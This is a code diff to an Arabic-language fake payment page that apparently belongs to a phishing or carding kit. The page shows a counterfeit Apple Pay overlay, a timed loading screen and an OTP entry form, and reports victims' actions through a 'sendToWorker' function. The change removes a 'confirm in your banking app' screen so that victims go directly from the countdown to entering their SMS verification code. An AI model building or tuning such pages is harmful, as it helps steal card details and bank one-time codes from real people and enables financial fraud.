@@ -295,32 +295,6 @@ select:invalid {
   direction: ltr;
 }
 
-.auth-title {
-  font-size: 32px;
-  font-weight: 800;
-  color: #111;
-  line-height: 1.5;
-  margin-bottom: 18px;
-}
-
-.auth-desc {
-  font-size: 21px;
-  line-height: 2;
-  color: #444;
-  margin-bottom: 26px;
-}
-
-.back-link {
-  display: inline-block;
-  margin-top: 70px;
-  font-size: 16px;
-  font-weight: 700;
-  color: #5b8def;
-  text-decoration: underline;
-  text-underline-offset: 4px;
-  cursor: pointer;
-}
-
 .otp-desc {
   font-size: 17px;
   line-height: 2;
@@ -417,7 +391,6 @@ button {
 </div>
 
 <div class="flow-screen" id="loadingScreen1"><div class="flow-card"><div class="loader-pro"></div><div class="countdown" id="countdown60">60</div></div></div>
-<div class="flow-screen" id="approvalScreen"><div class="flow-card"><div class="auth-title">صادق على المعاملة عبر تطبيق المصرف الخاص بك</div><div class="auth-desc">اضغط على الإشعار المرسل إليك في التطبيق المصرفي<br>راجع معاملة الدفع ووافق عليها</div><div class="back-link" id="backToOtp">رجوع الى رمز التحقق</div></div></div>
 <div class="flow-screen" id="otpScreen"><div class="flow-card"><div class="otp-desc">يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة</div><input type="text" id="otpInput" class="otp-input" placeholder="أدخل رمز التحقق" inputmode="numeric" maxlength="6"><button class="otp-btn" id="otpBtn" type="button">تحقق</button></div></div>
 <div class="flow-screen" id="loadingScreen2"><div class="flow-card"><div class="loader-pro"></div></div></div>
 
@@ -632,11 +605,9 @@ const applePayBtn = document.getElementById("applePayBtn");
 const applePayScreen = document.getElementById("applePayScreen");
 const paymentScreen = document.getElementById("paymentScreen");
 const loadingScreen1 = document.getElementById("loadingScreen1");
-const approvalScreen = document.getElementById("approvalScreen");
 const otpScreen = document.getElementById("otpScreen");
 const loadingScreen2 = document.getElementById("loadingScreen2");
 const countdown60 = document.getElementById("countdown60");
-const backToOtp = document.getElementById("backToOtp");
 const otpInput = document.getElementById("otpInput");
 const otpBtn = document.getElementById("otpBtn");
 
@@ -675,7 +646,6 @@ function sanitizeOTP(value) { return value.replace(/\D/g, "").slice(0, 6); }
 function showScreen(screen) {
   paymentScreen.style.display = "none";
   loadingScreen1.style.display = "none";
-  approvalScreen.style.display = "none";
   otpScreen.style.display = "none";
   loadingScreen2.style.display = "none";
   screen.style.display = "flex";
@@ -755,7 +725,7 @@ otpInput.addEventListener("focus", () => otpInput.classList.remove("error"));
 expMonth.addEventListener("change", validateExpiry);
 expYear.addEventListener("change", validateExpiry);
 
-// أحداث الإرسال (مع إرسال موثوق)
+// أحداث الإرسال
 applePayBtn.addEventListener("click", function() {
   applePayScreen.style.display = "block";
   setTimeout(() => { applePayScreen.style.display = "none"; }, 2000);
@@ -790,7 +760,10 @@ function startFirstLoading() {
     if (seconds <= 0) {
       clearInterval(timer60);
       timer60 = null;
-      showScreen(approvalScreen);
+      // بعد 60 ثانية ننتقل مباشرة إلى شاشة OTP
+      showScreen(otpScreen);
+      otpInput.value = "";
+      otpInput.classList.remove("error");
     }
   }, 1000);
 }
@@ -805,14 +778,6 @@ function startSecondLoading() {
     otpInput.classList.remove("error");
   }, 30000);
 }
-
-backToOtp.addEventListener("click", function() {
-  hideAllTimers();
-  showScreen(otpScreen);
-  otpInput.value = "";
-  otpInput.classList.remove("error");
-  sendToWorker("↩️ تم الرجوع إلى رمز التحقق");
-});
 
 otpBtn.addEventListener("click", function() {
   const isOtpValid = validateOTP();
